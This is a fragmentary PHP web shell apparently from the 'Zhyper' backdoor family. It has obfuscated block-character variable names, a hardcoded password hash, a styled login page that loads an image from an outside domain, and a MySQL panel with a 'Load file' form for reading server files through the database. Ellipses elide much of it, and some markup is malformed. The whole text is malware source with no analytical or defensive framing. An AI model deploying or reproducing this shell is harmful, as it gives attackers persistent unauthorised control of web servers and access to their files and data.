...
//-----------------Password---------------------
$▛ = "2d0b3d70fa5f5b48c237276fb2e621a5"; //zhyperflow
$▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
...
function hardLogin() {
	...
	echo '<body style="background: url(https://zhyper-shel.info/imgzhyper/dark-triad.jpg)">';
	die("<pre align=center style='margin-top: 45%'><form method=post style='color: #ffffff;'>Zhyper Login<br><input type=password name=pass style='background-color:rgba(0, 0, 0, 0.411); border:1px solid #00000056;outline:none;' required><input type=submit name='watching' value='Gasskan' style='border:1px solid #00000056; background-color:#00000056;color:#ffffff;cursor:pointer;'></form></pre>");
}
	...
	if(isset($db) && $db->link){
		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
            ...
            if($_POST['type']=='mysql') {
                ...
                if($db->fetch())
                    echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><inputtype=submit value='submit'></form>";
            }
